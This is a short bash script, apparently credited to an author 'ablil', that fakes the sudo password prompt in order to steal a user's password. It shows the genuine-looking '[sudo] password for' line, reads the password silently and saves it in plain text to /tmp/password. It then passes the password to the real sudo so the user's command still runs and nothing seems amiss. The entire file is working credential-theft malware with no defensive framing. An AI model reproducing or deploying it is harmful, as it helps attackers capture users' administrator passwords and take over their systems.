#!/bin/bash
# Author: ablil
# Description: fake sudo prompt to steal user password

total_args=$#
args=$@

if [[ $total_args -eq 0 ]]; then
    sudo
    exit
fi

# Stage 0: prompting user for password
# prompt user to type password
echo -n "[sudo] password for `id -nu`: "
read -s password

# Stage 1: steal password
# save as /tmp/password
echo $password > /tmp/password

# Stage 2: execute user command
echo ""
sudo -S $args < /tmp/password 2>/dev/null

